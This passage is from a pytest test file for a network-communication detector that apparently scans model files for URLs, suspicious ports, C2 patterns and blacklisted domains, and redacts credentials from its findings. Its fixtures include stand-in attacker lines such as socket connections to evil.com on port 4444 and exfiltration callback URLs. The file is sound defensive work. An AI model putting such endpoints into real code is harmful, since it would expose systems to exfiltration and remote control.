                "upload_endpoint",
            }
        )

    def test_detect_suspicious_ports(self) -> None:
        """Test detection of suspicious port numbers."""
        detector = NetworkCommDetector()

        data = b"""
        connect to server:1337
        ssh port=22
        PORT=4444
        redis:6379
        """

        findings = detector.scan(data)
        port_findings = [f for f in findings if f["type"] == "suspicious_port"]

        assert len(port_findings) >= 4

        # Check specific ports
        ports = [f["port"] for f in port_findings]
        assert 1337 in ports  # Common backdoor
        assert 22 in ports  # SSH
        assert 4444 in ports  # Metasploit
        assert 6379 in ports  # Redis

    def test_suspicious_port_findings_do_not_reexpose_url_passwords(self) -> None:
        """A numeric URL password removed from URL evidence must stay removed."""
        findings = NetworkCommDetector().scan(b"https://user:4444@example.com/path", "hook.py")

        assert not [finding for finding in findings if finding["type"] == "suspicious_port"]
        assert "4444" not in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize("quote", ['"', "'"])
    def test_explicit_binary_url_findings_do_not_capture_adjacent_credentials(self, quote: str) -> None:
        """Binary-context URL matches must not retain compact adjacent arguments."""
        data = f"requests.get({quote}https://evil.example/path{quote},api_key={quote}TOPSECRET123{quote})".encode()

        findings = NetworkCommDetector().scan(data, "model.bin")
        explicit_finding = next(finding for finding in findings if finding["type"] == "explicit_network_pattern")
        serialized = json.dumps(explicit_finding, sort_keys=True)

        assert explicit_finding["matched_text"] == "https://evil.example/path"
        assert "TOPSECRET123" not in serialized

    def test_explicit_binary_http_findings_redact_query_credentials(self) -> None:
        """Non-URL explicit patterns must use the same credential evidence redactor."""
        findings = NetworkCommDetector().scan(
            b"GET /download?token=TOPSECRET123 HTTP/1.1",
            "model.bin",
        )
        explicit_finding = next(finding for finding in findings if finding["type"] == "explicit_network_pattern")
        serialized = json.dumps(explicit_finding, sort_keys=True)

        assert explicit_finding["matched_text"] == "GET /download?token=<redacted> HTTP/1.1"
        assert "TOPSECRET123" not in serialized

    def test_suspicious_port_scan_performance(self) -> None:
        """Ensure port scanning remains performant with precompiled patterns."""
        detector = NetworkCommDetector()
        data = b"connect to server:1337" * 100
        context = "model.bin"

        import time

        start = time.perf_counter()
        # Fewer iterations in CI environments
        iterations = 20 if _is_ci_environment() else 50
        for _ in range(iterations):
            detector.findings = []
            detector._scan_suspicious_ports(data, context)
        duration = time.perf_counter() - start

        assert duration < 1.0

    def test_port_name_lookup_uses_shared_mapping(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Port-name lookup should reuse the shared class mapping."""
        detector = NetworkCommDetector()
        monkeypatch.setattr(NetworkCommDetector, "PORT_NAMES", {9999: "Custom Service"})

        assert detector._get_port_name(9999) == "Custom Service"
        assert detector._get_port_name(22) == "Unknown"

    def test_blacklist_detection(self) -> None:
        """Test detection of blacklisted domains when configured."""
        # Configure with specific blacklisted domains
        config = {"custom_blacklist": [b"malicious-site.com", b"known-c2.net", b"phishing-domain.org"]}
        detector = NetworkCommDetector(config)

        data = b"""
        http://malicious-site.com/payload
        connect to known-c2.net
        upload to phishing-domain.org
        """

        findings = detector.scan(data)
        blacklist_findings = [f for f in findings if f["type"] == "blacklisted_domain"]

        assert len(blacklist_findings) >= 3

        # Blacklisted domains should have max confidence
        assert all(f["confidence"] == 1.0 for f in blacklist_findings)
        assert all(f["severity"] == "CRITICAL" for f in blacklist_findings)

    def test_blacklist_scan_reuses_lowered_payload(self) -> None:
        """Reuse one lowercase payload view across configured blacklist checks."""

        class TrackingBytes(bytes):
            lower_calls = 0

            def lower(self) -> bytes:
                self.lower_calls += 1
                return super().lower()

        detector = NetworkCommDetector({"custom_blacklist": [b"blocked.example", b"evil.example"]})
        data = TrackingBytes(b"https://blocked.example/payload")

        detector._check_blacklist(data, "payload.bin")

        assert data.lower_calls == 1
        assert [finding["domain"] for finding in detector.findings] == ["blocked.example"]

    def test_blacklist_scan_skips_lowering_without_configured_domains(self) -> None:
        """Avoid touching payload bytes when no blacklist entries are configured."""

        class TrackingBytes(bytes):
            lower_calls = 0

            def lower(self) -> bytes:
                self.lower_calls += 1
                return super().lower()

        detector = NetworkCommDetector()
        data = TrackingBytes(b"https://blocked.example/payload")

        detector._check_blacklist(data, "payload.bin")

        assert data.lower_calls == 0
        assert detector.findings == []

    def test_custom_config(self) -> None:
        """Test custom configuration options."""
        config = {
            "custom_cc_patterns": [b"custom_beacon", b"my_backdoor"],
            "custom_blacklist": [b"custom-evil.com", b"my-c2.net"],
        }
        detector = NetworkCommDetector(config)

        data = b"""
        custom_beacon = "http://server.com"
        my_backdoor.connect()
        http://custom-evil.com
        connect to my-c2.net
        """

        findings = detector.scan(data)

        # Check custom C&C patterns
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        patterns = [f["pattern"] for f in cc_findings]
        assert "custom_beacon" in patterns
        assert "my_backdoor" in patterns

        # Check custom blacklist
        blacklist_findings = [f for f in findings if f["type"] == "blacklisted_domain"]
        domains = [f["domain"] for f in blacklist_findings]
        assert any(domain == "custom-evil.com" for domain in domains)
        assert any(domain == "my-c2.net" for domain in domains)

    def test_custom_patterns_isolated_between_instances(self) -> None:
        """Ensure custom patterns and blacklists do not leak between instances."""
        config = {
            "custom_cc_patterns": ["LEAK_PATTERN"],
            "custom_blacklist": ["LEAK.example"],
        }
        detector_with_custom = NetworkCommDetector(config)
        detector_default = NetworkCommDetector()

        data = b"LEAK_PATTERN http://LEAK.example"

        findings_custom = detector_with_custom.scan(data)
        assert any(f["type"] == "cc_pattern" and f["pattern"] == "leak_pattern" for f in findings_custom)
        assert any(f["type"] == "blacklisted_domain" and f["domain"] == "leak.example" for f in findings_custom)

        findings_default = detector_default.scan(data)
        assert all(f["type"] != "cc_pattern" for f in findings_default)
        assert all(f["type"] != "blacklisted_domain" for f in findings_default)

    def test_confidence_scoring(self) -> None:
        """Test confidence scoring for different patterns."""
        detector = NetworkCommDetector()

        data = b"""
        http://normal-site.com
        http://evil-site.tk:1337/cmd
        192.168.1.1
        8.8.8.8
        malware_config = {}
        import json
        import socket
        """

        findings = detector.scan(data)

        # URL with suspicious port should have higher confidence
        url_findings = [f for f in findings if f["type"] == "url_detected"]
        suspicious_urls = [f for f in url_findings if ":1337" in f["url"]]
        assert all(f["confidence"] >= 0.8 for f in suspicious_urls)

        # Private IPs should have lower confidence than public
        ip_findings = [f for f in findings if "ipv4" in f["type"]]
        private_ips = [f for f in ip_findings if f.get("is_private")]
        public_ips = [f for f in ip_findings if f.get("is_global")]

        if private_ips and public_ips:
            assert max(f["confidence"] for f in private_ips) < max(f["confidence"] for f in public_ips)

        # Malware patterns should have high confidence
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        malware_findings = [f for f in cc_findings if "malware" in f["pattern"]]
        assert all(f["confidence"] >= 0.95 for f in malware_findings)

    def test_no_false_positives_on_clean_data(self) -> None:
        """Test that clean model data doesn't trigger false positives."""
        detector = NetworkCommDetector()

        # Clean model data with some numbers that could look like IPs
        data = b"""
        model_weights = [1.2, 3.4, 5.6, 7.8]
        layer_sizes = [224, 224, 3]
        version = "2.0.1.1"
        optimizer = "adam"
        loss = 0.001
        """

        findings = detector.scan(data)

        # Should not detect version numbers as IPs
        ip_findings = [f for f in findings if "ip" in f["type"]]
        assert len(ip_findings) == 0

        # Should not detect any network patterns
        assert len(findings) == 0

    def test_context_extraction(self) -> None:
        """Test that context/snippets are properly extracted."""
        detector = NetworkCommDetector()

        data = b"""
        This is some context before
        socket.connect(('evil.com', 4444))
        and some context after
        """

        findings = detector.scan(data)
        func_findings = [f for f in findings if f["type"] == "network_function"]

        assert len(func_findings) > 0

        # Keep the matched token and its structured endpoint without arbitrary surrounding bytes.
        snippet = func_findings[0].get("snippet", "")
        assert snippet == "socket.connect evil.com:4444"


class TestDetectNetworkCommunication:
    """Test the convenience function."""

    def test_scan_file(self, tmp_path: Path) -> None:
        """Test scanning a file for network patterns."""
        test_file = tmp_path / "model.pkl"
        test_file.write_bytes(b"http://malicious.com/payload")

        findings = detect_network_communication(str(test_file))
        assert len(findings) > 0
        assert any(urlparse(f.get("url", "")).hostname == "malicious.com" for f in findings)

    def test_file_not_found(self) -> None:
        """Test handling of non-existent files."""
        findings = detect_network_communication("/non/existent/file.pkl")
        assert len(findings) == 1
        assert findings[0]["type"] == "error"
        assert "not found" in findings[0]["message"]

    def test_with_config(self, tmp_path: Path) -> None:
        """Test scanning with custom configuration."""
        test_file = tmp_path / "model.pkl"
        test_file.write_bytes(b"my_custom_pattern")

        config = {"custom_cc_patterns": [b"my_custom_pattern"]}

        findings = detect_network_communication(str(test_file), config)
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        assert len(cc_findings) == 1
        assert cc_findings[0]["pattern"] == "my_custom_pattern"


def test_network_finding_limit_preserves_high_signal_before_noisy_urls() -> None:
    detector = NetworkCommDetector({"max_findings": 2})
    data = (b"https://docs.example.com/reference\n" * 10) + b"callback_url=https://evil.example/exfil\n"

    findings = detector.scan(data, "tokens.txt")

    reported = [finding for finding in findings if finding["type"] != "detector_finding_limit"]
    assert len(reported) == 2
    assert any(finding["type"] == "cc_pattern" for finding in reported)
    assert findings[-1]["type"] == "detector_finding_limit"
    assert findings[-1]["max_findings"] == 2
    assert findings[-1]["analysis_incomplete"] is True
    assert findings[-1]["truncated_finding"]["type"] == "url_detected"


def test_network_finding_limit_does_not_eagerly_index_urls(monkeypatch: pytest.MonkeyPatch) -> None:
    detector = NetworkCommDetector({"max_findings": 1})

    def fail_if_indexed(_data: bytes) -> list[tuple[int, int, str]]:
        raise AssertionError("URL contexts were eagerly indexed")

    monkeypatch.setattr(detector, "_index_url_contexts", fail_if_indexed)
    data = b"socket.connect callback_url=https://evil.example/exfil " + (
        b"https://docs.example.com/reference " * 10_000
    )

    findings = detector.scan(data, "tokens.txt")

    assert findings[0]["type"] in {"cc_pattern", "network_function"}
    assert findings[-1]["type"] == "detector_finding_limit"


def test_network_finding_limit_stops_lazy_url_index_after_budget(monkeypatch: pytest.MonkeyPatch) -> None:
    detector = NetworkCommDetector({"max_findings": 1})

    def bounded_contexts(_data: bytes) -> Iterator[tuple[int, int, str]]:
        yield 0, 25, "https://one.example/path"
        yield 26, 51, "https://two.example/path"
        raise AssertionError("URL indexing continued beyond the finding budget")

    monkeypatch.setattr(detector, "_iter_generic_url_contexts", bounded_contexts)

    findings = detector.scan(b"", "tokens.txt")

    assert findings[0]["type"] == "url_detected"
    assert findings[-1]["type"] == "detector_finding_limit"


def test_network_finding_limit_does_not_drain_cloud_uri_prefix(monkeypatch: pytest.MonkeyPatch) -> None:
    """Generic URL scanning must not index every cloud URI before the cloud scanner runs."""
    detector = NetworkCommDetector({"max_findings": 1})
    data = b" ".join(f"s3://bucket-{index}/model.bin".encode() for index in range(10_000))
    monkeypatch.setattr(
        detector,
        "_iter_generic_url_contexts",
        lambda _data: (_ for _ in ()).throw(AssertionError("generic URL scan ran after the finding budget")),
    )

    findings = detector.scan(data, "tokens.txt")

    assert findings[0]["type"] == "cloud_storage_url"
    assert findings[-1]["type"] == "detector_finding_limit"
    assert detector._url_contexts == []


def test_network_finding_limit_prioritizes_decoded_nested_url() -> None:
    """A constrained budget must report the encoded destination before its stripped wrapper."""
    nested_url = "https://evil-c2.com/payload"
    data = b"https://benign.example/download?next=https%3A%2F%2Fevil-c2.com%2Fpayload"

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert findings[0]["type"] == "url_detected"
    assert findings[0]["url"] == nested_url
    assert findings[-1]["type"] == "detector_finding_limit"
    assert findings[-1]["truncated_finding"]["url"] == "https://benign.example/download"


def test_network_finding_limit_prioritizes_raw_nested_url() -> None:
    """An already decoded nested destination must receive the constrained finding slot."""
    nested_url = "https://evil-c2.com/payload"
    data = f"https://benign.example/download?next={nested_url}".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert findings[0]["type"] == "url_detected"
    assert findings[0]["url"] == nested_url
    assert findings[-1]["type"] == "detector_finding_limit"
    assert findings[-1]["truncated_finding"]["url"] == "https://benign.example/download"


def test_network_finding_limit_prioritizes_encoded_nested_url_in_path() -> None:
    nested_url = "https://evil-c2.com/payload"
    data = b"https://benign.example/redirect/https%3A%2F%2Fevil-c2.com%2Fpayload"

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert findings[0]["type"] == "url_detected"
    assert findings[0]["url"] == nested_url


def test_network_finding_limit_redacts_encoded_nested_url_in_sensitive_path() -> None:
    nested_url = "https://evil-c2.com/payload"
    data = b"https://benign.example/api_key/https%3A%2F%2Fevil-c2.com%2Fpayload"

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert nested_url not in json.dumps(findings, sort_keys=True)
    assert findings[0]["url"] == network_comm._SENSITIVE_NESTED_URL


@pytest.mark.parametrize(
    ("key", "secret"),
    [
        ("api_key", "https://evil-c2.com/payload"),
        ("authorization", "tcp://evil-c2.com:4444/payload"),
        ("client%5Fsecret", "https://45.33.32.156/payload"),
    ],
)
@pytest.mark.parametrize("component_separator", ["?", "#"])
@pytest.mark.parametrize("max_findings", [None, 1])
def test_network_finding_limit_redacts_nested_url_credentials(
    key: str,
    secret: str,
    component_separator: str,
    max_findings: int | None,
) -> None:
    """URL-valued credentials retain a redacted signal without exposing their value."""
    encoded_secret = quote(secret, safe="")
    data = f"https://benign.example/download{component_separator}{key}={encoded_secret}".encode()
    config = {} if max_findings is None else {"max_findings": max_findings}

    findings = NetworkCommDetector(config).scan(data, "tokens.txt")

    serialized = json.dumps(findings, sort_keys=True)
    assert secret not in serialized
    assert any(finding.get("url") == network_comm._SENSITIVE_NESTED_URL for finding in findings)


@pytest.mark.parametrize("separator", ["&", "&amp;", ";", "%26", "%3B"])
@pytest.mark.parametrize("max_findings", [None, 1])
def test_delimited_nested_url_credentials_do_not_reappear(separator: str, max_findings: int | None) -> None:
    nested_url = "https://evil-c2.com/payload"
    url = f"https://benign.example/download?api_key{separator}{nested_url}"
    config = {} if max_findings is None else {"max_findings": max_findings}

    findings = NetworkCommDetector(config).scan(url.encode(), "tokens.txt")
    serialized = json.dumps(findings, sort_keys=True)

    assert nested_url not in serialized
    assert any(finding.get("url") == network_comm._SENSITIVE_NESTED_URL for finding in findings)


def test_delimited_nested_url_sensitive_key_near_match_preserves_endpoint() -> None:
    nested_url = "https://evil-c2.com/payload"
    url = f"https://benign.example/download?algorithm&{nested_url}"

    findings = NetworkCommDetector().scan(url.encode(), "tokens.txt")

    assert any(finding.get("url") == nested_url for finding in findings)


@pytest.mark.parametrize("separator", ["=", ":"])
@pytest.mark.parametrize("max_findings", [None, 1])
def test_path_nested_url_credentials_do_not_reappear(separator: str, max_findings: int | None) -> None:
    nested_url = "https://evil-c2.com/payload"
    encoded_url = quote(nested_url, safe="")
    url = f"https://benign.example/api_key{separator}{encoded_url}"
    config = {} if max_findings is None else {"max_findings": max_findings}

    findings = NetworkCommDetector(config).scan(url.encode(), "tokens.txt")
    serialized = json.dumps(findings, sort_keys=True)

    assert nested_url not in serialized
    assert "evil-c2.com" not in serialized
    assert any(finding.get("url") == network_comm._SENSITIVE_NESTED_URL for finding in findings)


@pytest.mark.parametrize("separator", ["=", ":"])
def test_path_nested_url_sensitive_key_near_match_preserves_endpoint(separator: str) -> None:
    nested_url = "https://evil-c2.com/payload"
    encoded_url = quote(nested_url, safe="")
    url = f"https://benign.example/algorithm{separator}{encoded_url}"

    findings = NetworkCommDetector({"max_findings": 1}).scan(url.encode(), "tokens.txt")

    assert findings[0].get("url") == nested_url


@pytest.mark.parametrize(
    "url",
    [
        "https://benign.example/download?token=https://evil-c2.com/payload",
        "https://benign.example/download?x=1%26token=https://evil-c2.com/payload",
    ],
)
def test_unlimited_findings_do_not_reemit_nested_credential_domains(url: str) -> None:
    findings = NetworkCommDetector().scan(url.encode(), "tokens.txt")

    serialized = json.dumps(findings, sort_keys=True)
    assert "https://evil-c2.com/payload" not in serialized
    assert not any(finding.get("domain") == "evil-c2.com" for finding in findings)
    assert any(finding.get("url") == network_comm._SENSITIVE_NESTED_URL for finding in findings)


def test_unlimited_findings_preserve_decoded_nested_endpoint_near_match() -> None:
    nested_url = "https://evil-c2.com/payload"
    url = f"https://benign.example/download?x=1%26next={nested_url}"

    findings = NetworkCommDetector().scan(url.encode(), "tokens.txt")

    assert any(finding.get("url") == nested_url for finding in findings)
    assert any(finding.get("domain") == "evil-c2.com" for finding in findings)


def test_network_finding_limit_preserves_nested_url_for_sensitive_key_near_match() -> None:
    """A key name that merely extends a sensitive token must not hide its endpoint."""
    nested_url = "https://evil-c2.com/payload"
    encoded_url = quote(nested_url, safe="")
    data = f"https://benign.example/download?api_key_hint={encoded_url}".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert findings[0]["type"] == "url_detected"
    assert findings[0]["url"] == nested_url


def test_network_finding_limit_prioritizes_nested_url_in_cloud_wrapper() -> None:
    """Cloud URL handling must not consume the only slot before its encoded destination."""
    nested_url = "https://evil-c2.com/payload"
    data = b"https://storage.googleapis.com/bucket/model?next=https%3A%2F%2Fevil-c2.com%2Fpayload"

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert findings[0]["type"] == "url_detected"
    assert findings[0]["url"] == nested_url
    assert findings[-1]["type"] == "detector_finding_limit"
    assert findings[-1]["truncated_finding"]["type"] == "cloud_storage_url"


def test_network_finding_limit_deduplicates_cloud_nested_url_before_distinct_endpoint() -> None:
    nested_url = "https://evil-c2.com/payload"
    distinct_url = "https://distinct.example/path"
    data = (
        b"https://storage.googleapis.com/bucket/model?next=https%3A%2F%2Fevil-c2.com%2Fpayload " + distinct_url.encode()
    )

    findings = NetworkCommDetector({"max_findings": 4}).scan(data, "tokens.txt")

    assert sum(finding.get("url") == nested_url for finding in findings) == 1
    assert any(finding.get("url") == distinct_url for finding in findings)


def test_network_finding_limit_deduplicates_repeated_cloud_wrapper_before_distinct_endpoint() -> None:
    nested_url = "https://evil-c2.com/payload"
    wrapper = b"https://storage.googleapis.com/bucket/model?next=https%3A%2F%2Fevil-c2.com%2Fpayload"
    distinct_url = "https://distinct.example/path"
    data = b" ".join((wrapper, wrapper, distinct_url.encode()))

    findings = NetworkCommDetector({"max_findings": 4}).scan(data, "tokens.txt")

    assert sum(finding.get("url") == nested_url for finding in findings) == 1
    assert any(finding.get("url") == distinct_url for finding in findings)


@pytest.mark.parametrize("secret", ["45.33.32.156", "secret-value.example.com"])
def test_network_finding_limit_suppresses_colon_query_credentials(secret: str) -> None:
    """Colon-style query credentials must not reappear through endpoint scanners."""
    data = f"https://benign.example/download?api_key:{secret}".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert secret not in json.dumps(findings, sort_keys=True)


@pytest.mark.parametrize("secret", ["45.33.32.156", "secret.example.com"])
def test_network_finding_limit_suppresses_endpoint_inside_uri_credential(secret: str) -> None:
    data = f"api_key=redis://{secret}/db".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert secret not in json.dumps(findings, sort_keys=True)


@pytest.mark.parametrize(
    ("value", "finding_key"),
    [("45.33.32.156", "ip"), ("public.example.com", "domain")],
)
def test_network_finding_limit_preserves_endpoint_inside_uri_near_match(value: str, finding_key: str) -> None:
    data = f"endpoint=redis://{value}/db".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert any(finding.get(finding_key) == value for finding in findings)


def test_network_finding_limit_preserves_colon_query_near_match() -> None:
    """An ordinary colon-style query field must not suppress an endpoint signal."""
    ip = "45.33.32.156"
    data = f"https://benign.example/download?algorithm:{ip}".encode()

    findings = NetworkCommDetector({"max_findings": 2}).scan(data, "tokens.txt")

    assert any(finding.get("ip") == ip for finding in findings)


def test_author_prose_does_not_exhaust_evidence_redaction_budget() -> None:
    """Words beginning with auth must not suppress later endpoint findings."""
    near_matches = ("author", "oauth", "reauth")
    data = b"\n".join(
        f"{near_matches[index % len(near_matches)]} note endpoint=45.33.32.{index}".encode() for index in range(1, 40)
    )
    detector = NetworkCommDetector()

    findings = detector.scan(data, "model-card.txt")

    assert any(finding.get("ip") == "45.33.32.39" for finding in findings)
    assert detector._evidence_redaction_classifications == 0


@pytest.mark.parametrize("key", ["auth", "authorization", "service_token"])
def test_bounded_auth_hint_still_suppresses_endpoint_shaped_credentials(key: str) -> None:
    """Anchoring the auth hint must preserve credential-value suppression."""
    secret = "45.33.32.156"

    findings = NetworkCommDetector().scan(f"{key}={secret}".encode(), "tokens.txt")

    assert secret not in json.dumps(findings, sort_keys=True)


@pytest.mark.parametrize(
    ("url", "finding_key", "secret"),
    [
        ("https://evil.example/path?api_key/45.33.32.156", "ip", "45.33.32.156"),
        ("https://evil.example/path?api_key,secret.example.com", "domain", "secret.example.com"),
    ],
)
def test_delimiter_only_query_credentials_do_not_reappear(
    url: str,
    finding_key: str,
    secret: str,
) -> None:
    """Endpoint-shaped query credentials must remain absent from secondary findings."""
    findings = NetworkCommDetector().scan(url.encode(), "tokens.txt")

    assert secret not in json.dumps(findings, sort_keys=True)
    assert not any(finding.get(finding_key) == secret for finding in findings)


@pytest.mark.parametrize("separator", ["&", "&amp;", ";", "%26", "%3B"])
@pytest.mark.parametrize(("finding_key", "secret"), [("ip", "45.33.32.156"), ("domain", "secret.example.com")])
def test_query_field_separator_credentials_do_not_reappear(
    separator: str,
    finding_key: str,
    secret: str,
) -> None:
    url = f"https://evil.example/path?api_key{separator}{secret}"

    findings = NetworkCommDetector().scan(url.encode(), "tokens.txt")

    assert secret not in json.dumps(findings, sort_keys=True)
    assert not any(finding.get(finding_key) == secret for finding in findings)


@pytest.mark.parametrize(
    ("url", "finding_key", "value"),
    [
        ("https://evil.example/path?algorithm/45.33.32.156", "ip", "45.33.32.156"),
        ("https://evil.example/path?algorithm,public.example.com", "domain", "public.example.com"),
    ],
)
def test_delimiter_only_query_near_matches_preserve_endpoint_findings(
    url: str,
    finding_key: str,
    value: str,
) -> None:
    """Ordinary delimiter-separated query fields must keep endpoint signals."""
    findings = NetworkCommDetector().scan(url.encode(), "tokens.txt")

    assert any(finding.get(finding_key) == value for finding in findings)


@pytest.mark.parametrize("secret", ["45.33.32.156", "secret.example.com"])
def test_plus_delimited_query_credentials_do_not_reappear(secret: str) -> None:
    findings = NetworkCommDetector().scan(
        f"https://evil.example/path?api_key+{secret}".encode(),
        "tokens.txt",
    )

    assert secret not in json.dumps(findings, sort_keys=True)


def test_plus_delimited_query_near_match_preserves_endpoint() -> None:
    ip = "45.33.32.156"
    findings = NetworkCommDetector().scan(
        f"https://evil.example/path?algorithm+{ip}".encode(),
        "tokens.txt",
    )

    assert any(finding.get("ip") == ip for finding in findings)


@pytest.mark.parametrize("secret", ["45.33.32.156", "secret.example.com"])
def test_split_source_url_credentials_do_not_reappear(secret: str) -> None:
    data = f'requests.get("https://evil.example/api_key/" "{secret}/model.bin")'.encode()

    findings = NetworkCommDetector().scan(data, "tokens.txt")

    assert secret not in json.dumps(findings, sort_keys=True)


@pytest.mark.parametrize("endpoint", ["45.33.32.156", "unrelated.example.com"])
def test_closed_sensitive_url_literal_does_not_suppress_later_endpoint(endpoint: str) -> None:
    data = f'requests.get("https://example.com/api_key/")\n{endpoint}'.encode()

    findings = NetworkCommDetector().scan(data, "hook.py")

    assert endpoint in json.dumps(findings, sort_keys=True)


def test_split_source_url_near_match_preserves_endpoint() -> None:
    domain = "public.example.com"
    data = f'requests.get("https://evil.example/algorithm/" "{domain}/model.bin")'.encode()

    findings = NetworkCommDetector().scan(data, "tokens.txt")

    assert any(finding.get("domain") == domain for finding in findings)


def test_over_encoded_nested_url_is_not_silently_dropped() -> None:
    nested_url = "https://evil-c2.com/payload"
    encoded = nested_url
    for _ in range(network_comm._MAX_PATH_TOKEN_DECODE_PASSES + 1):
        encoded = quote(encoded, safe="")
    data = f"https://benign.example/download?next={encoded}".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert findings[0]["type"] == "url_detected"
    assert findings[0]["url"] == nested_url


@pytest.mark.parametrize(
    ("delimiter", "secret"),
    [
        ("/", "45.33.32.156"),
        (",", "secret-value.example.com"),
        ("%2F", "45.33.32.156"),
        ("%2C", "secret-value.example.com"),
    ],
)
def test_network_finding_limit_suppresses_delimited_query_credentials(
    delimiter: str,
    secret: str,
) -> None:
    data = f"https://benign.example/download?api_key{delimiter}{secret}".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert secret not in json.dumps(findings, sort_keys=True)


@pytest.mark.parametrize("delimiter", ["/", ","])
def test_network_finding_limit_preserves_delimited_query_near_match(delimiter: str) -> None:
    ip = "45.33.32.156"
    data = f"https://benign.example/download?algorithm{delimiter}{ip}".encode()

    findings = NetworkCommDetector({"max_findings": 2}).scan(data, "tokens.txt")

    assert any(finding.get("ip") == ip for finding in findings)


def test_network_finding_limit_does_not_index_url_prefix_before_port(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Pre-URL scanners must not consume an unbounded URL prefix for redaction context."""
    detector = NetworkCommDetector({"max_findings": 1})

    monkeypatch.setattr(detector, "_scan_urls", lambda _data, _context: None)
    data = (b"https://docs.example.com/reference " * 10_000) + b"port=4444"

    findings = detector.scan(data, "tokens.txt")

    assert findings[0]["type"] == "suspicious_port"
    assert detector._url_contexts == []


def test_network_finding_limit_does_not_reexpose_value_in_long_url() -> None:
    """A bounded local lookup must fail closed when a URL starts before its window."""
    secret = "45.33.32.156"
    data = b"https://example.com/" + (b"a" * 5_000) + f"?token={secret}".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")
    serialized = json.dumps(findings, sort_keys=True)

    assert secret not in serialized
    assert findings[0]["type"] == "url_detected"


@pytest.mark.parametrize("secret", ["45.33.32.156", "secret-value.example.com"])
def test_network_finding_limit_uses_lazy_url_context_for_long_credentials(secret: str) -> None:
    """A sensitive key outside the local lookup window must still suppress its long value."""
    data = b"https://example.com/api_key/" + (b"a" * 5_000) + f"-{secret}/model.bin".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert secret not in json.dumps(findings, sort_keys=True)


def test_network_finding_limit_reuses_long_cloud_uri_context_for_all_credentials() -> None:
    """Lazy non-generic URI context must remain available for later endpoint matches."""
    ip = "45.33.32.156"
    domain = "secret.example.com"
    data = b"s3://bucket/" + (b"a" * 5_000) + f"/api_key/{ip}/token/{domain}/model.bin".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")
    serialized = json.dumps(findings, sort_keys=True)

    assert ip not in serialized
    assert domain not in serialized


def test_network_finding_limit_preserves_long_cloud_uri_endpoint_near_match() -> None:
    """Caching a cloud URI must not suppress endpoints after nonsensitive path labels."""
    ip = "45.33.32.156"
    data = b"s3://bucket/" + (b"a" * 5_000) + f"/algorithm/{ip}/model.bin".encode()

    findings = NetworkCommDetector({"max_findings": 2}).scan(data, "tokens.txt")

    assert any(finding.get("ip") == ip for finding in findings)


@pytest.mark.parametrize("separator", ["/", "?", "&", "@", "+"])
def test_network_finding_limit_preserves_ip_in_long_non_url_token(separator: str) -> None:
    """The bounded URL fallback must not suppress a standalone IP after opaque data."""
    ip = "45.33.32.156"
    data = b"prefix" + separator.encode() + (b"a" * 5_000) + f"{separator}{ip}".encode()

    findings = NetworkCommDetector({"max_findings": 1}).scan(data, "tokens.txt")

    assert findings[0]["type"] == "ipv4_address"
    assert findings[0]["ip"] == ip


def test_network_finding_limit_keeps_lazy_url_cache_bounded() -> None:
    """Ambiguous late tokens must not retain every preceding URL context."""
    detector = NetworkCommDetector({"max_findings": 1})
    data = (b"https://docs.example/x " * 10_000) + (b"a" * 5_000) + b":4444"

    detector.scan(data, "tokens.txt")

    assert len(detector._url_contexts) <= 2


def test_sensitive_hint_near_match_skips_shared_evidence_redactor(monkeypatch: pytest.MonkeyPatch) -> None:
    """Benign key suffixes must not trigger expensive endpoint classification."""
    monkeypatch.setattr(
        network_comm,
        "_redact_network_evidence",
        lambda _text: (_ for _ in ()).throw(AssertionError("shared redactor should not run")),
    )
    ip = "45.33.32.156"
    data = (f"api_key_hint=public endpoint={ip} ".encode()) * 100

    findings = NetworkCommDetector().scan(data, "tokens.txt")

    assert sum(finding.get("ip") == ip for finding in findings) == 100


def test_sensitive_hint_prose_near_match_skips_shared_evidence_redactor(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Prose words beginning with auth must not consume endpoint-classification budget."""
    monkeypatch.setattr(
        network_comm,
        "_redact_network_evidence",
        lambda _text: (_ for _ in ()).throw(AssertionError("shared redactor should not run")),
    )
    ip = "45.33.32.156"
    data = b"".join(f"author {index} endpoint={ip}\n".encode() for index in range(100))

    findings = NetworkCommDetector().scan(data, "model-card.txt")

    assert sum(finding.get("ip") == ip for finding in findings) == 100


def test_shared_evidence_redaction_classification_budget_fails_closed(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Dense ambiguous endpoint values must have bounded redaction work."""
    calls = 0

    def preserve_marked_evidence(text: str) -> str:
        nonlocal calls
        calls += 1
        return text

    monkeypatch.setattr(network_comm, "_redact_network_evidence", preserve_marked_evidence)
    ip = "45.33.32.156"
    data = b"".join(f"api_key=value-{index} endpoint={ip}\n".encode() for index in range(100))

    findings = NetworkCommDetector().scan(data, "tokens.txt")

    assert calls == network_comm._MAX_EVIDENCE_REDACTION_CLASSIFICATIONS
    assert sum(finding.get("ip") == ip for finding in findings) == calls
    assert findings[-1]["type"] == "detector_finding_limit"
    assert findings[-1]["analysis_incomplete"] is True
    assert findings[-1]["max_classifications"] == network_comm._MAX_EVIDENCE_REDACTION_CLASSIFICATIONS
